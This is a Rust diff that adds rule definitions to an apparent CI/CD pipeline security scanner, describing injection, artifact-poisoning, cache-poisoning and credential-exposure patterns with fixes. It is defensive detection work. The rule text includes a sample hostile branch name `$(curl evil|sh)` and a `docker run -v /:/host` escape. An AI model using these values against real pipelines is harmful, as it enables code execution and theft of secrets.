@@ -409,6 +409,45 @@ pub const RULE_DEFS: &[RuleDef] = &[
         tags: &["security", "credentials", "azure-devops"],
     },
     RuleDef {
+        id: "secrets_inherit_overscoped_passthrough",
+        name: "SecretsInheritOverscopedPassthrough",
+        short_description:
+            "Reusable workflow called with `secrets: inherit` under an attacker-influenced trigger",
+        full_description:
+            "A reusable workflow `uses:` call uses `secrets: inherit` while the calling \
+             workflow is triggered by `pull_request`, `pull_request_target`, \
+             `pull_request_review`, `pull_request_review_comment`, `issue_comment`, or \
+             `workflow_run`. `inherit` forwards the entire caller secret bag to the callee \
+             regardless of which secrets the callee consumes — every transitive `uses:` in \
+             the called workflow inherits the same scope. Combined with a trigger an external \
+             party can fire (PR open, issue comment, workflow_run reaction), every secret in \
+             scope is one compromised callee away from exfiltration. Replace with an explicit \
+             `secrets:` mapping that lists only the secrets the callee actually needs.",
+        default_level: "error",
+        security_severity: "7.5",
+        tags: &["security", "propagation", "github-actions"],
+    },
+    RuleDef {
+        id: "unsafe_pr_artifact_in_workflow_run_consumer",
+        name: "UnsafePrArtifactInWorkflowRunConsumer",
+        short_description:
+            "workflow_run/pull_request_target consumer downloads and interprets a PR-context artifact",
+        full_description:
+            "A workflow triggered by `workflow_run` or `pull_request_target` downloads an \
+             artifact from the originating run AND interprets its content into a privileged \
+             sink — posting the bytes back to a PR comment, piping them into `$GITHUB_ENV`/\
+             `$GITHUB_OUTPUT`, `eval`, `unzip`/`tar -x`, or `cat`/`jq`. The producer ran in PR \
+             context, so a malicious PR can write arbitrary content into the artifact while \
+             the consumer runs with upstream-repo authority (typically `pull-requests: write` \
+             plus contents/issues scope). The classic mypy_primer / coverage-comment artifact \
+             RCE pattern. Treat downloaded artifacts as untrusted, validate against a strict \
+             schema, and never feed unsanitised content into a sink that mutates the \
+             environment, comments, or env vars.",
+        default_level: "error",
+        security_severity: "7.5",
+        tags: &["security", "supply-chain", "github-actions"],
+    },
+    RuleDef {
         id: "parameter_interpolation_into_shell",
         name: "ParameterInterpolationIntoShell",
         short_description:
@@ -615,6 +654,344 @@ pub const RULE_DEFS: &[RuleDef] = &[
         default_level: "warning",
         security_severity: "5.0",
         tags: &["security", "configuration", "gitlab"],
+        },
+        RuleDef {
+        id: "terraform_output_via_setvariable_shell_expansion",
+        name: "TerraformOutputViaSetvariableShellExpansion",
+        short_description:
+            "Terraform output captured into ##vso[task.setvariable] then expanded in a downstream shell — cross-step injection chain",
+        full_description:
+            "An ADO inline script (Bash@3, PowerShell@2, AzurePowerShell@5, AzureCLI@2 \
+             inline, or top-level `script:`) captures a Terraform output value — either a \
+             literal `terraform output` CLI invocation or a `$env:TF_OUT_*` / `$TF_OUT_*` \
+             env var sourced from a `TerraformCLI@*` `command: output` task — AND emits a \
+             `##vso[task.setvariable variable=NAME]VALUE` directive in the same step. A \
+             subsequent step in the same job then expands `$(NAME)` in shell-expansion \
+             position (`bash -c \"...\"`, `eval`, command substitution `$(...)`, PowerShell \
+             `-split` / `Invoke-Command` / `Invoke-Expression` / `iex`, or as an unquoted \
+             line-leading command word). The `task.setvariable` hop launders \
+             attacker-controlled Terraform state — sourced from a remote backend (S3 \
+             bucket, Azure Storage) whose IAM is often weaker than the pipeline's — \
+             through pipeline-variable space and into a shell interpreter. Pass the value \
+             via the downstream step's `env:` block (so the runtime quotes it as a shell \
+             variable) and validate the shape before splitting/looping.",
+        default_level: "error",
+        security_severity: "7.5",
+        tags: &["security", "injection", "azure-devops"],
+    },
+    RuleDef {
+        id: "risky_trigger_with_authority",
+        name: "RiskyTriggerWithAuthority",
+        short_description:
+            "High-blast-radius trigger paired with write permissions or non-default secrets.",
+        full_description:
+            "A workflow declares one of `issue_comment`, `pull_request_review`, \
+             `pull_request_review_comment`, or `workflow_run` alongside write-grant \
+             permissions or any secret other than the default `GITHUB_TOKEN`. These \
+             triggers carry the same effective blast radius as `pull_request_target` \
+             but slip past `trigger_context_mismatch`, exposing privileged credentials \
+             to anyone with comment access on the repo or any prior-run author.",
+        default_level: "error",
+        security_severity: "7.5",
+        tags: &["security", "privilege-escalation", "github-actions"],
+    },
+    RuleDef {
+        id: "sensitive_value_in_job_output",
+        name: "SensitiveValueInJobOutput",
+        short_description:
+            "Job output sourced from a secret/OIDC value or a credential-shaped name.",
+        full_description:
+            "A `jobs.<id>.outputs.<name>` declaration sources its value from \
+             `secrets.*`, an OIDC-bearing step output, or carries a credential-shaped \
+             name (suffix `_token`/`_secret`/`_key`/`_pem`/`_password`/`_credential[s]`/`_api_key`). \
+             Job outputs are written to the run log with only heuristic masking and \
+             propagate unmasked through `needs.<job>.outputs.*` to every downstream \
+             consumer — masking is never authoritative.",
+        default_level: "error",
+        security_severity: "7.5",
+        tags: &["security", "credentials", "github-actions"],
+    },
+    RuleDef {
+        id: "manual_dispatch_input_to_url_or_command",
+        name: "ManualDispatchInputToUrlOrCommand",
+        short_description:
+            "workflow_dispatch input flows into curl/wget/gh-api/checkout-ref — pivot to RCE.",
+        full_description:
+            "A `workflow_dispatch.inputs.*` value is interpolated into a command sink \
+             (`curl`, `wget`, `gh api`, `gh release`, `git clone`, `git fetch`) within a \
+             `run:` body, OR is used as the `ref:` for `actions/checkout`. Anyone with \
+             `Actions: write` on the repository can pivot the privileged run to \
+             attacker-controlled URLs/refs. Constrain the input via a `type: choice` \
+             allowlist or pass values through the step's `env:` block.",
+        default_level: "error",
+        security_severity: "7.5",
+        tags: &["security", "injection", "github-actions"],
+    },
+    RuleDef {
+        id: "script_injection_via_untrusted_context",
+        name: "ScriptInjectionViaUntrustedContext",
+        short_description:
+            "Untrusted context expression interpolated into a run/script body without env binding.",
+        full_description:
+            "A `run:` body or `actions/github-script` `script:` body interpolates an \
+             attacker-influenced `${{ … }}` expression — `github.event.*`, `github.head_ref`, \
+             or `inputs.*` from a privileged trigger — directly into the script text. The \
+             value is concatenated as raw shell/JS without going through an `env:` block, \
+             so a poisoned value (PR title/body, branch name) becomes arbitrary code on \
+             the runner. Pass attacker-influenced values through `env:` and reference them \
+             via `\"$VAR\"` (or `process.env.VAR` in github-script).",
+        default_level: "error",
+        security_severity: "9.0",
+        tags: &["security", "injection", "github-actions"],
+    },
+    RuleDef {
+        id: "interactive_debug_action_in_authority_workflow",
+        name: "InteractiveDebugActionInAuthorityWorkflow",
+        short_description:
+            "Interactive debug action (tmate/upterm) in a workflow holding non-default authority.",
+        full_description:
+            "A workflow that holds non-`GITHUB_TOKEN` secrets or non-default write \
+             permissions includes a step that uses an interactive debug action \
+             (`mxschmitt/action-tmate`, `lhotari/action-upterm`, `actions/tmate`, …). A \
+             maintainer flipping `debug_enabled=true` publishes the runner's full \
+             environment (every secret, the checked-out HEAD) over an external SSH \
+             endpoint. Remove the action or restrict it to a debugging-only workflow with \
+             no production secrets.",
+        default_level: "error",
+        security_severity: "7.5",
+        tags: &["security", "credentials", "github-actions"],
+    },
+    RuleDef {
+        id: "pr_specific_cache_key_in_default_branch_consumer",
+        name: "PrSpecificCacheKeyInDefaultBranchConsumer",
+        short_description:
+            "actions/cache key derives from PR-controlled context in a workflow that also runs on push to main.",
+        full_description:
+            "An `actions/cache` step keys the cache on a PR-derived expression \
+             (`github.head_ref`, `github.event.pull_request.head.ref`, `github.actor`) \
+             in a workflow that ALSO runs on `push: branches: [main]`. A PR can poison \
+             the cache that the default-branch build later restores — the classic \
+             cache-poisoning supply-chain primitive. Key the cache on stable inputs \
+             (commit SHA, lockfile hash) instead of PR-controlled context.",
+        default_level: "error",
+        security_severity: "7.5",
+        tags: &["security", "supply-chain", "github-actions"],
+    },
+    RuleDef {
+        id: "gh_cli_with_default_token_escalating",
+        name: "GhCliWithDefaultTokenEscalating",
+        short_description:
+            "gh CLI with default GITHUB_TOKEN performs write-class action in PR/issue/workflow_run trigger.",
+        full_description:
+            "A `run:` step uses `gh` / `gh api` with the default `GITHUB_TOKEN` to \
+             perform a write-class action (`pr merge`, `release create/upload`, \
+             `api -X POST/PATCH/PUT/DELETE` to repository, releases, secrets, or \
+             environments endpoints) inside a workflow triggered by `pull_request`, \
+             `issue_comment`, or `workflow_run`. Runtime privilege escalation that \
+             static permission audits miss — the token's scope at the YAML layer hides \
+             the actual write surface invoked at runtime.",
+        default_level: "error",
+        security_severity: "7.5",
+        tags: &["security", "privilege-escalation", "github-actions"],
+    },
+    RuleDef {
+        id: "ci_job_token_to_external_api",
+        name: "CiJobTokenToExternalApi",
+        short_description:
+            "GitLab `$CI_JOB_TOKEN` used as a bearer credential against an HTTP endpoint or `docker login`",
+        full_description:
+            "A GitLab CI job uses `$CI_JOB_TOKEN` (or `gitlab-ci-token:$CI_JOB_TOKEN`) as a \
+             bearer credential — passed to `curl`/`wget` against `${CI_API_V4_URL}/projects/...`, \
+             handed to `docker login registry.gitlab.com`, or sent as a `JOB-TOKEN:` / \
+             `Authorization:` header. CI_JOB_TOKEN's default scope is broad (container-registry \
+             write to the caller's project, Helm/Generic Package upload, project read), so a \
+             poisoned MR job that emits the token to an attacker-controlled endpoint can pivot \
+             to package or registry pushes. Scope the token under Settings → CI/CD → Job token \
+             permissions and prefer dedicated short-lived deploy tokens for uploads.",
+        default_level: "error",
+        security_severity: "7.5",
+        tags: &["security", "credentials", "gitlab-ci"],
+    },
+    RuleDef {
+        id: "id_token_audience_overscoped",
+        name: "IdTokenAudienceOverscoped",
+        short_description:
+            "GitLab `id_tokens:` audience is wildcard or shared between MR-context and protected jobs",
+        full_description:
+            "A GitLab CI `id_tokens:` declares an `aud:` value that is either a wildcard / \
+             catch-all string OR is reused across `merge_request_event` jobs and \
+             protected-branch jobs in the same file. The audience is what trades for \
+             downstream cloud / Vault credentials — when the same audience is reachable from \
+             both untrusted (MR) and privileged (protected-branch) jobs, a poisoned MR can \
+             mint a token that the downstream IdP will exchange for the same role the \
+             production deploy uses. Bind each downstream role / Vault path to a unique \
+             audience derived from the trust context of the consuming job.",
+        default_level: "error",
+        security_severity: "7.5",
+        tags: &["security", "privilege-escalation", "gitlab-ci"],
+    },
+    RuleDef {
+        id: "untrusted_ci_var_in_shell_interpolation",
+        name: "UntrustedCiVarInShellInterpolation",
+        short_description:
+            "Attacker-controlled GitLab predefined var interpolated unquoted into shell or environment.url",
+        full_description:
+            "A GitLab CI step interpolates an attacker-controlled predefined variable \
+             (`$CI_COMMIT_BRANCH`, `$CI_COMMIT_REF_NAME`, `$CI_COMMIT_TAG`, \
+             `$CI_COMMIT_MESSAGE`, `$CI_COMMIT_TITLE`, `$CI_COMMIT_DESCRIPTION`, \
+             `$CI_COMMIT_AUTHOR`, `$CI_MERGE_REQUEST_TITLE`, \
+             `$CI_MERGE_REQUEST_DESCRIPTION`, `$CI_MERGE_REQUEST_SOURCE_BRANCH_NAME`) \
+             into `script:` / `before_script:` / `after_script:` or into \
+             `environment:url:` without single-quote isolation or `printf %q` \
+             sanitisation. A branch named `` $(curl evil|sh) `` or an MR title containing \
+             backticks executes inside the runner with the job's full authority — the \
+             GitLab generalisation of the GitHub Actions `script-injection` class. Pass \
+             the value through the step's `variables:` block and reference it as a quoted \
+             shell variable, or use the pre-sanitised `$CI_COMMIT_REF_SLUG` for URL \
+             contexts.",
+        default_level: "error",
+        security_severity: "7.5",
+        tags: &["security", "injection", "gitlab-ci"],
+    },
+    RuleDef {
+        id: "unpinned_include_remote_or_branch_ref",
+        name: "UnpinnedIncludeRemoteOrBranchRef",
+        short_description:
+            "GitLab include: references a mutable branch (remote raw, project ref, or no ref).",
+        full_description:
+            "A GitLab CI `include:` references either (a) a `remote:` URL pointing at a \
+             branch (`/-/raw/<branch>/...`), (b) a `project:` whose `ref:` resolves to a \
+             mutable branch, or (c) an include with no `ref:` (defaults to HEAD). Whoever \
+             owns that branch can backdoor every consumer's pipeline silently — included \
+             YAML executes with the consumer's secrets and CI_JOB_TOKEN. Pin every \
+             include to a tag or commit SHA.",
+        default_level: "error",
+        security_severity: "7.5",
+        tags: &["security", "supply-chain", "gitlab-ci"],
+    },
+    RuleDef {
+        id: "dind_service_grants_host_authority",
+        name: "DindServiceGrantsHostAuthority",
+        short_description:
+            "GitLab job runs docker-in-docker AND holds a non-default secret — host filesystem reachable.",
+        full_description:
+            "A GitLab job declares a `services: [docker:*-dind]` sidecar AND holds at \
+             least one non-CI_JOB_TOKEN secret. docker-in-docker exposes the full Docker \
+             socket inside the job container — a malicious build step can `docker run -v \
+             /:/host` from inside dind and read the runner host filesystem (other jobs' \
+             artifacts, cached creds). Use rootless buildah/buildkit or split secret \
+             handling into a separate job that does not enable dind.",
+        default_level: "error",
+        security_severity: "7.5",
+        tags: &["security", "isolation", "gitlab-ci"],
+    },
+    RuleDef {
+        id: "security_job_silently_skipped",
+        name: "SecurityJobSilentlySkipped",
+        short_description:
+            "Scanner job (sast/dast/secret_detection/etc) runs with allow_failure: true and no surfacing rule.",
+        full_description:
+            "A GitLab job whose name or `extends:` matches scanner patterns (`sast`, \
+             `dast`, `secret_detection`, `dependency_scanning`, `container_scanning`, \
+             `gitleaks`, `trivy`, `grype`, `semgrep`, …) runs with `allow_failure: true` \
+             AND has no `rules:` clause that surfaces the failure. The pipeline goes \
+             green even when the scan errors out — silent-pass is worse than no scan \
+             because reviewers trust the badge. Drop `allow_failure:` or guard it with \
+             a `rules: when: manual` that requires explicit override.",
+        default_level: "warning",
+        security_severity: "5.0",
+        tags: &["security", "supply-chain", "gitlab-ci"],
+    },
+    RuleDef {
+        id: "child_pipeline_trigger_inherits_authority",
+        name: "ChildPipelineTriggerInheritsAuthority",
+        short_description:
+            "GitLab trigger: job runs in MR context OR uses dynamic include:artifact: — code-injection sink.",
+        full_description:
+            "A GitLab `trigger:` job (downstream / child pipeline) runs in \
+             `merge_request_event` context OR uses `include: artifact:` from a previous \
+             job (dynamic child pipeline). Dynamic child pipelines are a code-injection \
+             sink — anything the build step writes to the artifact runs as a real \
+             pipeline with the parent project's secrets. Restrict `trigger:` jobs to \
+             protected-branch contexts and prefer static `include:local:` over dynamic \
+             artifact-based includes.",
+        default_level: "error",
+        security_severity: "7.5",
+        tags: &["security", "privilege-escalation", "gitlab-ci"],
+    },
+    RuleDef {
+        id: "cache_key_crosses_trust_boundary",
+        name: "CacheKeyCrossesTrustBoundary",
+        short_description:
+            "GitLab cache key is hardcoded or shared between MR and protected jobs without policy: pull.",
+        full_description:
+            "A GitLab `cache:` declaration whose `key:` is hardcoded, `$CI_JOB_NAME` \
+             only, or `$CI_COMMIT_REF_SLUG` without a `policy: pull` restriction. \
+             Caches are stored per-runner keyed by `key:`; a poisoned MR can push a \
+             malicious `node_modules/` cache that the next default-branch job downloads \
+             and executes during `npm install`. Key the cache on `$CI_COMMIT_SHA` plus a \
+             lockfile hash, or set `policy: pull` on jobs that should never write the \
+             cache.",
+        default_level: "error",
+        security_severity: "7.5",
+        tags: &["security", "supply-chain", "gitlab-ci"],
+    },
+    RuleDef {
+        id: "pat_embedded_in_git_remote_url",
+        name: "PatEmbeddedInGitRemoteUrl",
+        short_description:
+            "CI script embeds a credential variable inside a git remote URL (https://user:$TOKEN@host)",
+        full_description:
+            "A CI `script:` body constructs an HTTPS git URL with a credential-shaped \
+             variable embedded directly in the URL (e.g. \
+             `git remote set-url origin https://user:${PAT_TOKEN}@gitlab.com/org/repo.git`). \
+             Once git executes against that URL the token's resolved value is visible in \
+             the process argv (`ps`, `/proc/*/cmdline`), persists in `.git/config` for \
+             the rest of the job (where any subsequent step can read it), and lands in \
+             `GIT_TRACE` output if enabled. Switch to a credential helper or pass the \
+             token via `http.extraHeader` so it never enters argv or on-disk config.",
+        default_level: "error",
+        security_severity: "7.5",
+        tags: &["security", "credentials", "gitlab"],
+    },
+    RuleDef {
+        id: "ci_token_triggers_downstream_with_variable_passthrough",
+        name: "CiTokenTriggersDownstreamWithVariablePassthrough",
+        short_description:
+            "CI_JOB_TOKEN-driven cross-project pipeline trigger forwards `variables[…]` to the downstream pipeline",
+        full_description:
+            "A CI script invokes the GitLab REST API \
+             (`POST /api/v4/projects/:id/trigger/pipeline`) with `CI_JOB_TOKEN` and \
+             forwards user-influenced values via `variables[KEY]=...` query/form fields. \
+             The downstream project receives those variables in its pipeline scope — a \
+             cross-project authority bridge that bypasses the `trigger:`-keyword \
+             parent-child trust model. When the upstream job runs on merge-request \
+             pipelines the variable values may originate from attacker-controlled \
+             context. Prefer the `trigger:` keyword with `strategy: depend` and \
+             constrain which variables the downstream pipeline accepts.",
+        default_level: "warning",
+        security_severity: "5.0",
+        tags: &["security", "propagation", "gitlab"],
+    },
+    RuleDef {
+        id: "dotenv_artifact_flows_to_privileged_deployment",
+        name: "DotenvArtifactFlowsToPrivilegedDeployment",
+        short_description:
+            "GitLab dotenv artifact flows to a downstream deployment job with a production-like environment",
+        full_description:
+            "A GitLab job declares `artifacts.reports.dotenv: <file>`. The file's \
+             `KEY=value` lines are silently promoted to pipeline variables for any \
+             consumer linked via `needs:` or `dependencies:` — there is no explicit \
+             download visible at the job level. When a consumer in a later stage \
+             targets a production-like environment (`prod`, `production`, `prd`, \
+             `live`), or when the producer's script reads attacker-influenced inputs \
+             (`CI_COMMIT_REF_NAME`, `CI_MERGE_REQUEST_SOURCE_BRANCH_NAME`, \
+             `CI_COMMIT_TAG`), the dotenv flow is a covert privilege-escalation \
+             channel. Validate dotenv-promoted values in the consumer before use, or \
+             prefer pipeline-scoped variables for deployment selection.",
+        default_level: "error",
+        security_severity: "7.5",
+        tags: &["security", "propagation", "gitlab"],
     },
 ];
 
@@ -1251,6 +1628,28 @@ mod tests {
             FindingCategory::UntrustedApiResponseToEnvSink,
             FindingCategory::PrBuildPushesImageWithFloatingCredentials,
             FindingCategory::SecretViaEnvGateToUntrustedConsumer,
+            FindingCategory::SecretViaEnvGateToUntrustedConsumer,
+            FindingCategory::TerraformOutputViaSetvariableShellExpansion,
+            FindingCategory::RiskyTriggerWithAuthority,
+            FindingCategory::SensitiveValueInJobOutput,
+            FindingCategory::ManualDispatchInputToUrlOrCommand,
+            FindingCategory::SecretsInheritOverscopedPassthrough,
+            FindingCategory::UnsafePrArtifactInWorkflowRunConsumer,
+            FindingCategory::ScriptInjectionViaUntrustedContext,
+            FindingCategory::InteractiveDebugActionInAuthorityWorkflow,
+            FindingCategory::PrSpecificCacheKeyInDefaultBranchConsumer,
+            FindingCategory::GhCliWithDefaultTokenEscalating,
+            FindingCategory::CiJobTokenToExternalApi,
+            FindingCategory::IdTokenAudienceOverscoped,
+            FindingCategory::UntrustedCiVarInShellInterpolation,
+            FindingCategory::UnpinnedIncludeRemoteOrBranchRef,
+            FindingCategory::DindServiceGrantsHostAuthority,
+            FindingCategory::SecurityJobSilentlySkipped,
+            FindingCategory::ChildPipelineTriggerInheritsAuthority,
+            FindingCategory::CacheKeyCrossesTrustBoundary,
+            FindingCategory::PatEmbeddedInGitRemoteUrl,
+            FindingCategory::CiTokenTriggersDownstreamWithVariablePassthrough,
+            FindingCategory::DotenvArtifactFlowsToPrivilegedDeployment,
         ];
 
         for cat in categories {
